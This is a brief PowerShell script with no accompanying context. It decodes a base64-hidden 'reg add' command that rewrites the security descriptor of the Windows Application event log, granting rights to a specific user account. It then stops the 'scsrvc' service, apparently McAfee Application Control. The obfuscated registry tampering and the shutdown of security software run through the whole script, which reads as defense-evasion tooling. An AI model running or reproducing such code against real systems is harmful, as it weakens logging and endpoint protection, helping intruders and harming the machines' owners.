$varA ='cmVnIGFkZCBIS0xNXFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxTZXJ2aWNlc1xFdmVudExvZ1xBcHBsaWNhdGlvbiAvdiBDdXN0b21TRCAvdCBSRUdfU1ogL2QgIk86QkFHOlNZRDooQTs7MHhmMDAwNTs7O1NZKShBOzsweDU7OztCQSkoQTs7MHgxOzs7Uy0xLTUtMzItNTczKShBOzsweDM7OztTLTEtNS0yMS0xMzQ5ODI0MzAyLTM0MjMyNjYxNTktMTAzMjQ1ODY2LTEwMDApIg=='
$varB = [System.Convert]::FromBase64String($varA)
$varC = [System.Text.Encoding]::UTF8.GetString($varB)
cmd /c $varC
start-sleep -seconds 2
net stop scsrvc